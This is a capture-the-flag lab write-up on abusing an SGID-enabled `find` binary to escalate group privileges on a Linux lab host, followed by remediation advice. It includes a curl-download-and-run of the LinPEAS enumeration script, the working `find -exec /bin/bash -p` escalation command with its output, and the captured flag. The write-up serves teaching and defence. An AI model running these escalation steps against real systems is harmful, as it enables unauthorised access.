# SUID Secrets — Lab Writeup

**Category:** Linux Privilege Escalation
**Difficulty:** Medium
**Target:** `172.31.5.209` (Ubuntu 20.04.6 LTS)
**Flag:** `ctf{ai3ooph4yaiYiquie7Ahr6chaequahru}`

## Objective

Locate and abuse a custom/misconfigured SUID (or SGID) binary to gain elevated access on the target system.

## Recon

Connected over SSH with provided low-privilege credentials (`user`):

```bash
ssh user@172.31.5.209
```

Initial `id` showed a standard unprivileged account:

```
uid=1001(user) gid=1002(user) groups=1002(user)
```

### Enumerating SUID/SGID binaries

A first pass with `find` turned up only stock Ubuntu SUID binaries (`sudo`, `passwd`, `mount`, `su`, snap-packaged copies, etc.) — nothing obviously custom:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Since the manual scan didn't reveal anything unusual, [LinPEAS](https://github.com/peass-ng/PEASS-ng) was pulled onto the target and run for a full enumeration pass:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas_output.txt
```

Grepping the output for `SGID` surfaced the misconfigured binary:

```
-rwxr-sr-x 1 root ctf 313K Feb 18 2020 /usr/bin/find
```

## The Vulnerability

`/usr/bin/find` — a completely standard system utility — had been given the **SGID bit**, with group ownership set to `ctf`:

- Normal `find` permissions: `-rwxr-xr-x`
- Modified permissions: `-rwxr-sr-x root:ctf`

This meant **any user** who ran `find` would execute it with an effective group ID (`egid`) of `ctf`, regardless of their real group membership.

This lined up with a restricted directory spotted earlier:

```
drwxr-x--- 2 root ctf 4096 Jul 6 17:47 /home/ctf
```

Only members of the `ctf` group could read that directory — and `find`'s SGID bit was the way in.

## Exploitation

`find` is a well-known [GTFOBins](https://gtfobins.github.io/gtfobins/find/) entry: its `-exec` flag can spawn an arbitrary subprocess, and that subprocess inherits the effective privileges of the `find` process itself.

```bash
find . -maxdepth 0 -exec /bin/bash -p \;
```

**Why `-p` matters:** bash drops any elevated setuid/setgid privileges on startup by default, as a safety measure. The `-p` ("privileged") flag disables that behavior, so the spawned shell keeps the inherited `egid=ctf`.

Confirming the escalation:

```bash
bash-5.0$ id
uid=1001(user) gid=1002(user) egid=1001(ctf) groups=1001(ctf),1002(user)
```

## Capturing the Flag

With `ctf` group membership active in the shell, the restricted directory and flag file became readable:

```bash
bash-5.0$ cd /home/ctf
bash-5.0$ ls -la
-r--r----- 1 root ctf 38 Jul 6 17:47 flag

bash-5.0$ cat flag
ctf{ai3ooph4yaiYiquie7Ahr6chaequahru}
```

## Root Cause

A common utility (`find`) was granted an SGID bit it should never have had. Because `find` supports arbitrary command execution via `-exec`, any special permission bit on it (SUID *or* SGID) is immediately exploitable to fully assume the identity of the owning user/group.

## Remediation

- Never set SUID/SGID bits on general-purpose utilities capable of executing arbitrary commands (`find`, `vim`, `less`, `awk`, `python`, `cp`, `nmap`, etc.).
- If a binary must run with elevated group access, use a narrowly scoped wrapper script instead, or grant access via `sudo` with a tightly restricted command list.
- Regularly audit the system for SUID/SGID binaries and diff against a known-good baseline:
  ```bash
  find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
  ```
- Cross-reference any hits against [GTFOBins](https://gtfobins.github.io/) to catch exploitable binaries before an attacker does.

## Tools Used

- `ssh`
- `find` (for enumeration and — ironically — the exploit itself)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng)
- [GTFOBins](https://gtfobins.github.io/)
